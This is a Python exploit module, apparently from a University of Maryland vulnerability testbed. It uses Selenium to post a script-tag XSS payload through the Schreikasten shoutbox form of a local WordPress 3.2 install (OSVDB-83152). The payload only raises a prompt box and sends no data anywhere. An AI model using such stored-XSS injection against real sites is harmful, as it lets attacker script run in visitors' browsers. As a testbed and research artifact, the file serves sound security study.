
# Copyright 2013 University of Maryland.  All rights reserved.
# Use of this source code is governed by a BSD-style
# license that can be found in the LICENSE.TXT file.


import framework
import time

class Exploit (framework.Exploit):
    attributes = {'Name' : "OSVDB_83152",
                  'Description' : "Creates a post containing a XSS payload.",
                  'References' : [['OSVDB','83152'],['http://www.osvdb.org/show/osvdb/83152']],
                  'Target' : "Wordpress 3.2",
                  'TargetLicense' : '',
                  'Type' : "XSS",
                  'VulWikiPage' : "http://seamster.cs.umd.edu/vulwiki/index.php/OSVDB-83152",
                  'Plugin' : "Schreikasten 0.14.13"                                                                                  
                  }

    def __init__(self, visible=False):
        framework.Exploit.__init__(self, visible)
        return

    def exploit(self):
        payload = "<script>prompt(\"Attack!!\")</script>"
        driver = self.create_selenium_driver()
        driver.get("http://localhost/wordpress")          
        self.logger.info("Page opened successfully: %s", driver.title)
        self.logger.info("uploading payload: %s", payload)
        driver.get_element(by_xpath="//input[contains(@id,'sk_alias')]").clear() 
        driver.get_element(by_xpath="//input[contains(@id,'sk_alias')]").send_keys("John Doe") 
        driver.get_element(by_xpath="//input[contains(@id,'sk_email')]").clear() 
        driver.get_element(by_xpath="//input[contains(@id,'sk_email')]").send_keys("johndoe@aol.com") 
        driver.get_element(by_xpath="//*[contains(@id,'sk_text')]").clear() 
        driver.get_element(by_xpath="//*[contains(@id,'sk_text')]").send_keys(payload)
        driver.get_element(by_xpath="//*[contains(@id,'sk_button')]").send_keys("\n")
        driver.get_element(by_class="sk-userdata-user")
        time.sleep(10)
        driver.cleanup()
        return

    def verify(self):
        return True
